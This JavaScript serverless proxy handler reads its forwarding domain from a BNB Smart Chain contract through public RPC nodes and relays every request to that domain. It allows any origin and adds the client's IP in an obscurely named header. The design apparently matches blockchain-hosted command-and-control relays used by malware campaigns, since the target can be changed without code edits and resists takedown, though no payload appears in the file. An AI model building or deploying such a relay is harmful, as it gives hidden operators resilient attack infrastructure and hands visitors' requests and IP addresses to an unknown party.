import fetch from "node-fetch";

// --- In-memory cache ---
let cache = { domain: null, timestamp: 0 };
const UPDATE_INTERVAL = 60 * 1000; // 60s

// --- Get client IP ---
function getClientIP(req) {
  if (req.headers["cf-connecting-ip"]) return req.headers["cf-connecting-ip"];
  if (req.headers["x-forwarded-for"])
    return req.headers["x-forwarded-for"].split(",")[0].trim();
  return req.socket.remoteAddress;
}

// --- Hex to string (from contract result) ---
function hexToString(hex) {
  hex = hex.replace(/^0x/, "");
  const length = parseInt(hex.slice(64, 128), 16);
  const dataHex = hex.slice(128, 128 + length * 2);
  let result = "";
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substr(i, 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

// --- Fetch target domain from blockchain ---
async function fetchTargetDomain() {
  const rpcUrls = [
    "https://binance.llamarpc.com",
    "https://bsc.drpc.org"
  ];
  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
  const data = "0x20965255";

  for (const rpcUrl of rpcUrls) {
    try {
      const resp = await fetch(rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [{ to: contractAddress, data }, "latest"]
        })
      });

      const json = await resp.json();
      if (json.result) return hexToString(json.result);
    } catch (err) {
      console.error("RPC fetch error:", err);
    }
  }

  throw new Error("Could not fetch target domain");
}

// --- Get cached target domain ---
async function getTargetDomain() {
  const now = Date.now();
  if (cache.domain && now - cache.timestamp < UPDATE_INTERVAL) return cache.domain;
  const domain = await fetchTargetDomain();
  cache = { domain, timestamp: now };
  return domain;
}

// --- Main Handler ---
export const config = {
  api: {
    bodyParser: false, // So we can forward raw body
  },
};

export default async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  const { e } = req.query;
  if (!e) return res.status(400).send("Missing endpoint");

  if (e === "ping_proxy") {
    res.setHeader("Content-Type", "text/plain");
    return res.status(200).send("pong");
  }

  try {
    const targetDomain = await getTargetDomain();
    const endpoint = "/" + decodeURIComponent(e).replace(/^\//, "");
    const url = `${targetDomain}${endpoint}`;

    // --- Read raw body ---
    const rawBody = await new Promise((resolve) => {
      let data = [];
      req.on("data", (chunk) => data.push(chunk));
      req.on("end", () => resolve(Buffer.concat(data)));
    });

    // --- Forward headers (except restricted) ---
    const headers = { ...req.headers };
    delete headers.host;
    delete headers.origin;
    delete headers["accept-encoding"];
    delete headers["content-encoding"];

    headers["x-dfkjldifjlifjd"] = getClientIP(req);

    const proxyResp = await fetch(url, {
      method: req.method,
      headers,
      body: ["GET", "HEAD"].includes(req.method) ? undefined : rawBody
    });

    const contentType = proxyResp.headers.get("content-type") || "application/octet-stream";
    const buffer = Buffer.from(await proxyResp.arrayBuffer());

    res.status(proxyResp.status);
    res.setHeader("Content-Type", contentType);
    res.send(buffer);
  } catch (error) {
    console.error("Proxy error:", error);
    res.status(500).send(`error: ${error.message}`);
  }
}